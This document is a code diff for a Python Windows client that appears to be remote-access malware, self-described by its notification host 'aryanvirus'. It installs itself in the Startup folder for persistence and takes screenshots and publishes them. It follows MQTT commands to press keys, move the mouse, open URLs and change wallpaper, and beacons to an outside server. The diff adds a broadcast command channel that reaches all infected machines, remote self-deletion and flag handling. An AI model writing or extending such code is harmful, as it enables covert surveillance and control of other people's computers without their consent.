@@ -55,6 +55,7 @@ def resource_path(relative_path):
 pg.FAILSAFE = False
 # Startup setup
 FLAG_FILE = Path(os.getenv('APPDATA')) / "firstrun.flag"
+N_FLAG_FILE = Path(os.getenv('APPDATA')) / "notification.flag"
 
 def add_to_startup():
     try:
@@ -69,6 +70,10 @@ def add_to_startup():
 if not FLAG_FILE.exists():
     add_to_startup()
     FLAG_FILE.touch()
+
+nFlag = False    
+if N_FLAG_FILE.exists():
+    nFlag = True    
 
 # Server / MQTT settings
 # serverUrl = "http://localhost:3000"
@@ -88,6 +93,7 @@ pc_id = f"{pc_name}_{mac}"
 # MQTT topics
 CONTROL_TOPIC = f"control/{pc_id}"
 ACK_TOPIC = f"ack/{pc_id}"
+BROADCAST_TOPIC = "control/broadcast"
 # Screenshot
 def take_screenshot():
     try:
@@ -100,6 +106,25 @@ def take_screenshot():
         os.remove(filename)
     except Exception as e:
         client.publish(ACK_TOPIC,f"[screenshot error : {pc_id}] {e}")
+
+
+def deleteScript():
+    startup_path = Path(os.getenv('APPDATA')) / r"Microsoft\Windows\Start Menu\Programs\Startup"
+    file_to_delete = os.path.join(startup_path, "client.exe") 
+    if os.path.exists(file_to_delete):
+        os.remove(file_to_delete)
+        client.publish(ACK_TOPIC,f"DELETED CLIENT.EXE :{pc_id}")
+    if os.path.exists(FLAG_FILE):
+        os.remove(FLAG_FILE)
+        client.publish(ACK_TOPIC,f"DELETED FIRSTRUN.FLAG :{pc_id}")
+
+def deleteFlag():
+    if os.path.exists(N_FLAG_FILE):
+        os.remove(N_FLAG_FILE)
+        client.publish(ACK_TOPIC,f"DELETED NOTIFICATION.FLAG :{pc_id}")   
+def saveFlag():
+    if not N_FLAG_FILE.exists():
+        N_FLAG_FILE.touch()                            
 
 def safe_thread(target, *args, **kwargs):
     def wrapper():
@@ -139,7 +164,8 @@ def handle_msg(msg):
         elif msg == "cut":
             safe_thread(pg.press, "backspace")
         elif msg == "drawheart":
-            draw_heart()
+            resp=draw_heart()
+            client.publish(ACK_TOPIC, f"Draw Heart : {resp}")
         elif msg == "mouseright":
             pg.rightClick()  
         elif msg == "mouseleft":
@@ -158,7 +184,6 @@ def handle_msg(msg):
             full_volume()
         elif msg == "mutevolume":
             mute_volume()         
-
         elif msg =="startrandommove":
             start_random_move()
         elif msg == "stoprandommove":
@@ -173,6 +198,12 @@ def handle_msg(msg):
             os.execv(sys.executable,[sys.executable]+sys.argv)     
         elif msg == "end":
             os._exit(0)
+        elif msg == "deletescript":
+            deleteScript()    
+        elif msg == "saveflag":
+            saveFlag()
+        elif msg == "deleteflag":
+            deleteFlag()        
         elif msg.startswith("browser"):
             url = msg[len("browser "):]
             safe_thread(webbrowser.open, url)
@@ -238,7 +269,7 @@ def handle_msg(msg):
             def setw():
                 res=set_wallpaper_from_url(link)
                 client.publish(ACK_TOPIC, f"Set Wallpaper {pc_id}: {res}")
-            safe_thread(setw)    
+            safe_thread(setw)        
 
         elif msg.startswith("remap"):
             parts = msg[len("remap "):].split()
@@ -388,6 +419,7 @@ keyboard.add_hotkey("ctrl+shift+a+s", stop_random_move)
 def on_connect(client, userdata, flags, rc):
     print(f"{pc_id} Connected to MQTT broker, code: {rc}")
     client.subscribe(CONTROL_TOPIC)
+    client.subscribe(BROADCAST_TOPIC)
     client.publish(ACK_TOPIC, f"{pc_id} Connected")
     # requests.get(f"https://aryanvirus.onrender.com/notify?msg={pc_id} : Connected")
 
@@ -412,14 +444,10 @@ def on_disconnect(client, userdata, rc):
     threading.Thread(target=reconnect_loop, daemon=True).start()
 
 
-# MQTT client setup
 client = mqtt.Client()
 client.username_pw_set(USERNAME, PASSWORD)
-# ca_path = resource_path("emqxsl-ca.crt")
-# client.tls_set(ca_certs=ca_path, cert_reqs=ssl.CERT_REQUIRED)
-# client.tls_insecure_set(True)
-client.tls_set()                # Use system CA store
-client.tls_insecure_set(False)  # Verify certificates
+client.tls_set()  
+client.tls_insecure_set(False)  
 client.on_connect = on_connect
 client.on_message = on_message
 client.on_disconnect = on_disconnect
@@ -448,15 +476,14 @@ def connect_mqtt_nonblocking():
             try:
                 client.connect(BROKER, PORT, 300)
                 print("MQTT connected successfully.")
-                requests.get(f"https://aryanvirus.onrender.com/notify?msg={pc_id} : Connected")
+                if nFlag:
+                    requests.get(f"https://aryanvirus.onrender.com/notify?msg={pc_id} : Connected")
                 break
             except Exception as e:
                 print(f"MQTT connection failed: {e}, retrying in {delay}s...")
                 time.sleep(delay)
                 delay = min(delay + 5, 60)
     threading.Thread(target=_connect, daemon=True).start()
-
-
 
 connect_mqtt_nonblocking()
 client.loop_forever()
